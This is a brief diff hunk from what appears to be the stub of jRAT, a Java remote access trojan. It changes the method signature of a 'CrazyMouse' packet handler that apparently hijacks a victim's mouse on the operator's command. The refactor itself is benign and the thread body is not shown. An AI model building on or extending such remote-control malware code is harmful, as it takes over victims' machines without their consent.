@@ -10,7 +10,7 @@ import se.jrat.stub.utils.ScreenUtils;
 public class Packet46CrazyMouse extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		final int time = Connection.instance.readInt();
 		new Thread() {
 			public void run() {
